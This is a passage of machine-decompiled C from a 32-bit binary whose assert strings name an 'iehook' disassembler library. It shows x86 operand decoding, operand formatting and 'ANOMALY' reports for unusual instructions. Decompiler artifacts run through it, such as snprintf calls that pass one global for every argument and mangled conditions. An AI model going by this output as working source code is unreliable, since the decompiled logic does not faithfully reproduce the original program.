                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v690 = *v677;
                                    }
                                    // 0x10004d7a
                                    v72 = v69;
                                    v61 = v690;
                                    v65 = v63;
                                    if ((int16_t)v690 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004d87
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 133: {
                        // 0x10004d98
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10004da2
                            *(int16_t *)(v79 + 6) = 2;
                            int32_t * v691 = (int32_t *)(v79 + 16); // 0x10004dab
                            *v691 = 130;
                            int32_t * v692 = (int32_t *)v79; // 0x10004db2
                            if ((*v692 & 0x4000) != 0) {
                                // 0x10004dba
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v693 = *v29; // 0x10004dce
                                *v29 = v693 + 16 & 48 | v693 & -49;
                                if (v75 >= 2) {
                                    // 0x10004dee
                                    *(int32_t *)(v63 - 4) = 2827;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x10004e08
                            if ((*v692 & 0x2000) != 0) {
                                // 0x10004e10
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x10004e39
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v694 = *v18; // 0x10004e43
                                int32_t v695 = v694; // 0x10004e43
                                int32_t * v696 = (int32_t *)(v63 - 4); // 0x10004e66
                                *v696 = *(int32_t *)(4 * *v691 + (int32_t)&g68);
                                int32_t * v697 = (int32_t *)(v63 - 8); // 0x10004e67
                                *v697 = (int32_t)"<%s>";
                                int32_t * v698 = (int32_t *)(v63 - 12); // 0x10004e6c
                                *v698 = v694 == -1 ? 0 : 256 - v695;
                                *(int32_t *)(v63 - 16) = v19 + v695;
                                int32_t v699 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10004e75
                                unsigned char v700 = *v18 + (char)v699; // 0x10004e7a
                                *v18 = v700;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004e93
                                    *(char *)(v19 + (int32_t)v700) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v701 = *v692; // 0x10004ea1
                                    int32_t v702 = v701; // 0x10004ea7
                                    if ((v701 & 0xe000) == 0) {
                                        // 0x10004ea9
                                        *v696 = 2832;
                                        *v697 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v698 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v702 = *v692;
                                    }
                                    int32_t v703 = v702; // 0x10004ec6
                                    if ((v702 & 0x200000) != 0) {
                                        // 0x10004ec8
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v703 = *v692;
                                    }
                                    int32_t v704 = v703; // 0x10004ee0
                                    if ((v703 & 0x100000) != 0) {
                                        // 0x10004ee2
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v704 = *v692;
                                    }
                                    int32_t v705 = v704; // 0x10004efa
                                    if ((v704 & 1024) != 0) {
                                        // 0x10004efc
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v705 = *v692;
                                    }
                                    // 0x10004f0e
                                    v72 = v69;
                                    v61 = v705;
                                    v65 = v63;
                                    if ((int16_t)v705 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004f1b
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 134: {
                        // 0x10004f2c
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10004f36
                            *(int16_t *)(v79 + 6) = 4;
                            int32_t * v706 = (int32_t *)(v79 + 16); // 0x10004f3f
                            *v706 = 145;
                            int32_t * v707 = (int32_t *)v79; // 0x10004f46
                            if ((*v707 & 0x4000) != 0) {
                                // 0x10004f4e
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v708 = *v29; // 0x10004f62
                                *v29 = v708 + 16 & 48 | v708 & -49;
                                if (v75 >= 2) {
                                    // 0x10004f82
                                    *(int32_t *)(v63 - 4) = 2839;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x10004f9c
                            if ((*v707 & 0x2000) != 0) {
                                // 0x10004fa4
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x10004fcd
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v709 = *v18; // 0x10004fd7
                                int32_t v710 = v709; // 0x10004fd7
                                int32_t * v711 = (int32_t *)(v63 - 4); // 0x10004ffa
                                *v711 = *(int32_t *)(4 * *v706 + (int32_t)&g68);
                                int32_t * v712 = (int32_t *)(v63 - 8); // 0x10004ffb
                                *v712 = (int32_t)"<%s>";
                                int32_t * v713 = (int32_t *)(v63 - 12); // 0x10005000
                                *v713 = v709 == -1 ? 0 : 256 - v710;
                                *(int32_t *)(v63 - 16) = v19 + v710;
                                int32_t v714 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005009
                                unsigned char v715 = *v18 + (char)v714; // 0x1000500e
                                *v18 = v715;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005027
                                    *(char *)(v19 + (int32_t)v715) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v716 = *v707; // 0x10005035
                                    int32_t v717 = v716; // 0x1000503b
                                    if ((v716 & 0xe000) == 0) {
                                        // 0x1000503d
                                        *v711 = 2844;
                                        *v712 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v713 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v717 = *v707;
                                    }
                                    int32_t v718 = v717; // 0x1000505a
                                    if ((v717 & 0x200000) != 0) {
                                        // 0x1000505c
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v718 = *v707;
                                    }
                                    int32_t v719 = v718; // 0x10005074
                                    if ((v718 & 0x100000) != 0) {
                                        // 0x10005076
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v719 = *v707;
                                    }
                                    int32_t v720 = v719; // 0x1000508e
                                    if ((v719 & 1024) != 0) {
                                        // 0x10005090
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v720 = *v707;
                                    }
                                    // 0x100050a2
                                    v72 = v69;
                                    v61 = v720;
                                    v65 = v63;
                                    if ((int16_t)v720 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x100050af
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 135: {
                        // 0x100045cc
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            int16_t * v721 = (int16_t *)(v79 + 6); // 0x100045de
                            *v721 = 1;
                            char v722 = 8 * *v31 & 8 | v32; // 0x100045f2
                            int32_t v723 = v722 | 112; // 0x100045f7
                            int32_t * v724 = (int32_t *)(v79 + 16); // 0x100045fa
                            *v724 = v723;
                            if (*(int32_t *)(*v27 + 4) == 3) {
                                // 0x10004606
                                *v724 = v723 + 48;
                            }
                            int32_t * v725 = (int32_t *)v79;
                            if ((*v725 & 0x4000) != 0) {
                                // 0x10004614
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v726 = *v29; // 0x1000462b
                                *v29 = v726 + 16 & 48 | v726 & -49;
                                if (v75 >= 2) {
                                    // 0x1000464b
                                    *(int32_t *)(v63 - 4) = 2765;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                                // 0x10004662
                                if (!((v722 != 4 | *v721 < 2))) {
                                    // 0x1000466e
                                    *v33 = *v33 | 2048;
                                }
                            }
                            // 0x10004678
                            if ((*v725 & 0x2000) != 0) {
                                // 0x10004680
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x100046ac
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                // 0x100046b6
                                *(char *)(v19 + (int32_t)*v18) = 60;
                                unsigned char v727 = *v18 + 1; // 0x100046c2
                                *v18 = v727;
                                int32_t v728 = v727; // 0x100046c8
                                int32_t v729 = v63 - 4; // 0x100046ea
                                int32_t * v730 = (int32_t *)v729; // 0x100046ea
                                *v730 = *(int32_t *)(4 * *v724 + (int32_t)&g68);
                                *(int32_t *)(v63 - 8) = v727 == -1 ? 0 : 256 - v728;
                                *(int32_t *)(v63 - 12) = v19 + v728;
                                int32_t v731 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100046f4
                                unsigned char v732 = *v18 + (char)v731; // 0x100046f9
                                *v18 = v732;
                                *(char *)(v19 + (int32_t)v732) = 62;
                                unsigned char v733 = *v18 + 1; // 0x1000470b
                                *v18 = v733;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004724
                                    *(char *)(v19 + (int32_t)v733) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v734 = *v725; // 0x10004732
                                    v60 = v734;
                                    v59 = v725;
                                    v71 = v69;
                                    v68 = v63;
                                    if ((v734 & 0xe000) != 0) {
                                        goto lab_0x10004487;
                                    } else {
                                        // 0x1000473e
                                        *v730 = 2771;
                                        v58 = v725;
                                        v70 = v69;
                                        v64 = v729;
                                        goto lab_0x10004475;
                                    }
                                }
                            }
                        }
                    }
                    case 136: {
                        // 0x100050c0
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100050ca
                            *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            char v735 = *v26 & 15;
                            switch (v735) {
                                case 2: {
                                    // 0x10005109
                                    *(int32_t *)(v79 + 16) = 133;
                                    // break -> 0x10005110
                                    break;
                                }
                                case 4: {
                                    // 0x10005100
                                    *(int32_t *)(v79 + 16) = 149;
                                    // break -> 0x10005110
                                    break;
                                }
                                default: {
                                    if (v735 != 8) {
                                        // 0x1000af50
                                        *(int32_t *)(v63 - 4) = 2856;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    // 0x100050f7
                                    *(int32_t *)(v79 + 16) = 213;
                                    // break -> 0x10005110
                                    break;
                                }
                            }
                            int32_t * v736 = (int32_t *)v79; // 0x10005110
                            if ((*v736 & 0x4000) != 0) {
                                // 0x10005118
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v737 = *v29; // 0x1000512c
                                *v29 = v737 + 16 & 48 | v737 & -49;
                                if (v75 >= 2) {
                                    // 0x1000514c
                                    *(int32_t *)(v63 - 4) = 2858;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x10005166
                            if ((*v736 & 0x2000) != 0) {
                                // 0x1000516e
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x10005197
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v738 = *v18; // 0x100051a1
                                int32_t v739 = v738; // 0x100051a1
                                int32_t v740 = *(int32_t *)(v79 + 16); // 0x100051ba
                                int32_t * v741 = (int32_t *)(v63 - 4); // 0x100051c4
                                *v741 = *(int32_t *)(4 * v740 + (int32_t)&g68);
                                int32_t * v742 = (int32_t *)(v63 - 8); // 0x100051c5
                                *v742 = (int32_t)"<%s>";
                                int32_t * v743 = (int32_t *)(v63 - 12); // 0x100051ca
                                *v743 = v738 == -1 ? 0 : 256 - v739;
                                *(int32_t *)(v63 - 16) = v19 + v739;
                                int32_t v744 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100051d3
                                unsigned char v745 = *v18 + (char)v744; // 0x100051d8
                                *v18 = v745;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100051f1
                                    *(char *)(v19 + (int32_t)v745) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v746 = *v736; // 0x100051ff
                                    int32_t v747 = v746; // 0x10005205
                                    if ((v746 & 0xe000) == 0) {
                                        // 0x10005207
                                        *v741 = 2863;
                                        *v742 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v743 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v747 = *v736;
                                    }
                                    int32_t v748 = v747; // 0x10005224
                                    if ((v747 & 0x200000) != 0) {
                                        // 0x10005226
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v748 = *v736;
                                    }
                                    int32_t v749 = v748; // 0x1000523e
                                    if ((v748 & 0x100000) != 0) {
                                        // 0x10005240
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v749 = *v736;
                                    }
                                    int32_t v750 = v749; // 0x10005258
                                    if ((v749 & 1024) != 0) {
                                        // 0x1000525a
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v750 = *v736;
                                    }
                                    // 0x1000526c
                                    v72 = v69;
                                    v61 = v750;
                                    v65 = v63;
                                    if ((int16_t)v750 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005279
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 138: {
                        // 0x10005454
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000545e
                            *(int16_t *)(v79 + 6) = (int16_t)(*v26 / 2 & 7);
                            char v751 = *v26 & 15;
                            switch (v751) {
                                case 2: {
                                    // 0x1000549f
                                    *(int32_t *)(v79 + 16) = 112;
                                    // break -> 0x100054a6
                                    break;
                                }
                                case 4: {
                                    // 0x10005496
                                    *(int32_t *)(v79 + 16) = 128;
                                    // break -> 0x100054a6
                                    break;
                                }
                                default: {
                                    if (v751 != 8) {
                                        // 0x1000af8e
                                        *(int32_t *)(v63 - 4) = 2893;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    // 0x1000548d
                                    *(int32_t *)(v79 + 16) = 144;
                                    // break -> 0x100054a6
                                    break;
                                }
                            }
                            int32_t * v752 = (int32_t *)v79; // 0x100054a6
                            if ((*v752 & 0x4000) != 0) {
                                // 0x100054ae
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v753 = *v29; // 0x100054c2
                                *v29 = v753 + 16 & 48 | v753 & -49;
                                if (v75 >= 2) {
                                    // 0x100054e2
                                    *(int32_t *)(v63 - 4) = 2895;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x100054fc
                            if ((*v752 & 0x2000) != 0) {
                                // 0x10005504
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x1000552d
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v754 = *v18; // 0x10005537
                                int32_t v755 = v754; // 0x10005537
                                int32_t v756 = *(int32_t *)(v79 + 16); // 0x10005550
                                int32_t * v757 = (int32_t *)(v63 - 4); // 0x1000555a
                                *v757 = *(int32_t *)(4 * v756 + (int32_t)&g68);
                                int32_t * v758 = (int32_t *)(v63 - 8); // 0x1000555b
                                *v758 = (int32_t)"<%s>";
                                int32_t * v759 = (int32_t *)(v63 - 12); // 0x10005560
                                *v759 = v754 == -1 ? 0 : 256 - v755;
                                *(int32_t *)(v63 - 16) = v19 + v755;
                                int32_t v760 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005569
                                unsigned char v761 = *v18 + (char)v760; // 0x1000556e
                                *v18 = v761;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005587
                                    *(char *)(v19 + (int32_t)v761) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v762 = *v752; // 0x10005595
                                    int32_t v763 = v762; // 0x1000559b
                                    if ((v762 & 0xe000) == 0) {
                                        // 0x1000559d
                                        *v757 = 2900;
                                        *v758 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v759 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v763 = *v752;
                                    }
                                    int32_t v764 = v763; // 0x100055ba
                                    if ((v763 & 0x200000) != 0) {
                                        // 0x100055bc
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v764 = *v752;
                                    }
                                    int32_t v765 = v764; // 0x100055d4
                                    if ((v764 & 0x100000) != 0) {
                                        // 0x100055d6
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v765 = *v752;
                                    }
                                    int32_t v766 = v765; // 0x100055ee
                                    if ((v765 & 1024) != 0) {
                                        // 0x100055f0
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v766 = *v752;
                                    }
                                    // 0x10005602
                                    v72 = v69;
                                    v61 = v766;
                                    v65 = v63;
                                    if ((int16_t)v766 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000560f
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    default: {
                        goto lab_0x1000b0c4;
                    }
                }
            }
        } else {
            int16_t v767; // 0x10003490
            if (v81 < 0xe000001) {
                if (v81 == 0xe000000) {
                    // 0x100074a4
                    *(int16_t *)(v79 + 6) = 10;
                    char * v768 = (char *)(v79 + 4); // 0x100074ad
                    *v768 = *v768 & -64 | 3;
                    goto lab_0x100076d9;
                } else {
                    if (v81 < 0x8000001) {
                        // 0x1000731d
                        if (v81 == 0x8000000) {
                            // 0x100076d5
                            *(int16_t *)(v79 + 6) = 2;
                            goto lab_0x100076d9;
                        } else {
                            if (v81 < 0x5000001) {
                                // 0x1000732f
                                switch (v81) {
                                    case 0x5000000: {
                                        // 0x100076d5
                                        *(int16_t *)(v79 + 6) = 8;
                                        goto lab_0x100076d9;
                                    }
                                    case 0x2000000: {
                                        // 0x100076d5
                                        *(int16_t *)(v79 + 6) = 1;
                                        goto lab_0x100076d9;
                                    }
                                    case 0x3000000: {
                                        // 0x100076d5
                                        *(int16_t *)(v79 + 6) = 4;
                                        goto lab_0x100076d9;
                                    }
                                    default: {
                                        if (v81 != 0x4000000) {
                                            // break -> 0x1000b0c4
                                            break;
                                        }
                                        char v769 = *v25; // 0x10007355
                                        if ((v769 & 16) == 0) {
                                            // 0x1000735e
                                            if ((*v28 & 8) != 0) {
                                                char v770 = v769; // 0x1000736b
                                                if (v16 == 0) {
                                                    uint32_t v771 = *v21; // 0x1000736d
                                                    uint32_t v772 = *v23 + v771; // 0x10007374
                                                    *(int32_t *)(v63 - 4) = *v24 + v771 / 0x80000000 + (int32_t)(v772 < v771);
                                                    *(int32_t *)(v63 - 8) = v772;
                                                    *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Segment override used when segment is explicit\n";
                                                    _printf((char *)&g173);
                                                    v770 = *v25;
                                                }
                                                // 0x10007395
                                                *v25 = v770 | 16;
                                            }
                                        }
                                        unsigned char v773 = *v26 & 15;
                                        if (v773 == 2) {
                                            // 0x100076d5
                                            *(int16_t *)(v79 + 6) = 4;
                                            goto lab_0x100076d9;
                                        } else {
                                            int32_t v774 = (int32_t)v773 - 4; // 0x100073af
                                            if (v774 != 0 == (v774 != 4)) {
                                                // 0x1000b029
                                                *(int32_t *)(v63 - 4) = 3306;
                                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                                __wassert();
                                                return 0;
                                            }
                                            // 0x100076d5
                                            *(int16_t *)(v79 + 6) = 6;
                                            goto lab_0x100076d9;
                                        }
                                    }
                                }
                            } else {
                                if (v81 == 0x6000000) {
                                    // 0x100073f5
                                    v767 = *(int32_t *)(*v27 + 4) != 3 ? 6 : 10;
                                } else {
                                    if (v81 != 0x7000000) {
                                        // break -> 0x1000b0c4
                                        break;
                                    }
                                    // 0x100073e5
                                    v767 = (int16_t)(*v26 & 15);
                                }
                                // 0x100076d5
                                *(int16_t *)(v79 + 6) = v767;
                                goto lab_0x100076d9;
                            }
                        }
                    } else {
                        if (v81 < 0xb000001) {
                            switch (v81) {
                                case 0xb000000: {
                                    // 0x10007460
                                    *(int16_t *)(v79 + 6) = 10;
                                    char * v775 = (char *)(v79 + 4); // 0x10007469
                                    *v775 = *v775 & -64 | 4;
                                    goto lab_0x100076d9;
                                }
                                case 0x9000000: {
                                    goto lab_0x10007448;
                                }
                                default: {
                                    if (v81 != 0xa000000) {
                                        // break -> 0x1000b0c4
                                        break;
                                    }
                                    goto lab_0x10007430;
                                }
                            }
                        } else {
                            if (v81 == 0xc000000) {
                                goto lab_0x10007448;
                            } else {
                                if (v81 != 0xd000000) {
                                    // break -> 0x1000b0c4
                                    break;
                                }
                                // 0x1000748c
                                *(int16_t *)(v79 + 6) = 8;
                                char * v776 = (char *)(v79 + 4); // 0x10007495
                                *v776 = *v776 & -64 | 3;
                                goto lab_0x100076d9;
                            }
                        }
                    }
                }
            } else {
                if (v81 < 0x14000001) {
                    if (v81 == 0x14000000) {
                        unsigned char v777 = *v26 & 15;
                        if (v777 == 2) {
                            // 0x100076d5
                            *(int16_t *)(v79 + 6) = 4;
                            goto lab_0x100076d9;
                        } else {
                            int32_t v778 = (int32_t)v777 - 4; // 0x100075b4
                            if (v778 == 0) {
                                // 0x100076d5
                                *(int16_t *)(v79 + 6) = 4;
                                goto lab_0x100076d9;
                            } else {
                                // 0x100075b9
                                if (v778 != 4) {
                                    // 0x1000b0a5
                                    *(int32_t *)(v63 - 4) = 3317;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                    __wassert();
                                    return 0;
                                }
                                // 0x100076d5
                                *(int16_t *)(v79 + 6) = 8;
                                goto lab_0x100076d9;
                            }
                        }
                    } else {
                        if (v81 < 0x11000001) {
                            // 0x100074da
                            switch (v81) {
                                case 0x11000000: {
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = 512;
                                    goto lab_0x100076d9;
                                }
                                case 0xf000000: {
                                    unsigned char v779 = *v26 & 15;
                                    v767 = 14;
                                    if (v779 != 2) {
                                        int32_t v780 = (int32_t)v779 - 4; // 0x10007530
                                        v767 = 28;
                                        if (v780 != 0 == (v780 != 4)) {
                                            // 0x1000b067
                                            *(int32_t *)(v63 - 4) = 3374;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                    }
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = v767;
                                    goto lab_0x100076d9;
                                }
                                default: {
                                    if (v81 != 0x10000000) {
                                        // break -> 0x1000b0c4
                                        break;
                                    }
                                    unsigned char v781 = *v26 & 15;
                                    v767 = 94;
                                    if (v781 != 2) {
                                        int32_t v782 = (int32_t)v781 - 4; // 0x100074ff
                                        v767 = 108;
                                        if (v782 != 0 == (v782 != 4)) {
                                            // 0x1000b048
                                            *(int32_t *)(v63 - 4) = 3384;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                    }
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = v767;
                                    goto lab_0x100076d9;
                                }
                            }
                        } else {
                            if (v81 == 0x12000000) {
                                unsigned char v783 = *v26 & 15;
                                if (v783 == 2) {
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = 2;
                                    goto lab_0x100076d9;
                                } else {
                                    int32_t v784 = (int32_t)v783 - 4; // 0x1000758d
                                    if (v784 != 0 == (v784 != 4)) {
                                        // 0x1000b086
                                        *(int32_t *)(v63 - 4) = 3275;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = 4;
                                    goto lab_0x100076d9;
                                }
                            } else {
                                // 0x10007564
                                if (v81 != 0x13000000) {
                                    // break -> 0x1000b0c4
                                    break;
                                }
                                // 0x100076d5
                                *(int16_t *)(v79 + 6) = 16;
                                goto lab_0x100076d9;
                            }
                        }
                    }
                } else {
                    if (v81 < 0x17000001) {
                        switch (v81) {
                            case 0x17000000: {
                                // 0x10007648
                                if ((v6 & 3) != 3) {
                                    goto lab_0x10007430;
                                } else {
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = 16;
                                    goto lab_0x100076d9;
                                }
                            }
                            case 0x15000000: {
                                // 0x10007605
                                if ((*v2 & 8) == 0) {
                                    // 0x1000760e
                                    *(int32_t *)(v63 - 4) = 3323;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                    __wassert();
                                }
                                // 0x1000762b
                                v767 = 2;
                                if ((v6 & 3) == 3) {
                                    // 0x10007638
                                    v767 = (int16_t)(*v26 & 15);
                                }
                                // 0x100076d5
                                *(int16_t *)(v79 + 6) = v767;
                                goto lab_0x100076d9;
                            }
                            default: {
                                if (v81 != 0x16000000) {
                                    // break -> 0x1000b0c4
                                    break;
                                }
                                // 0x100075ee
                                if ((v6 & 3) != 3) {
                                    goto lab_0x10007448;
                                } else {
                                    // 0x100076d5
                                    *(int16_t *)(v79 + 6) = 16;
                                    goto lab_0x100076d9;
                                }
                            }
                        }
                    } else {
                        if (v81 == 0x18000000) {
                            if (v16 == 0) {
                                uint32_t v785 = *v21; // 0x100076a1
                                uint32_t v786 = *v23 + v785; // 0x100076a8
                                *(int32_t *)(v63 - 4) = *v24 + v785 / 0x80000000 + (int32_t)(v786 < v785);
                                *(int32_t *)(v63 - 8) = v786;
                                *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Undocumented loadall instruction?\n";
                                _printf((char *)&g173);
                            }
                            // 0x100076c9
                            *v25 = *v25 | 16;
                            v767 = 204;
                        } else {
                            if (v81 != 0x19000000) {
                                // break -> 0x1000b0c4
                                break;
                            }
                            if (v75 != 1) {
                                // 0x10007675
                                *(int32_t *)(v63 - 4) = 3330;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex == 1";
                                __wassert();
                            }
                            // 0x10007692
                            v767 = *v20;
                        }
